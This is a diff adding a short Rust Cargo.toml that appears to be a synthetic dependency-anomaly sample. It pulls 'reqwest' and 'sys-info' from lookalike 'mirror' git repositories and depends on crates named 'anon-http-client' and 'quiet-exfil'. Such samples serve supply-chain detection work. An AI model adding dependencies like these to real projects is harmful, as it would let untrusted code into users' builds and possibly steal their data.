@@ -1,0 +1,11 @@
+[package]
+name = "syn_depanomaly_220"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+reqwest = { git = "https://github.com/rust-lang-mirror-cdn/reqwest" }
+anon-http-client = "0.0.1"
+quiet-exfil = "0.0.1"
+sys-info = { git = "https://github.com/totally-legit-mirror/sys-info-mirror" }
+
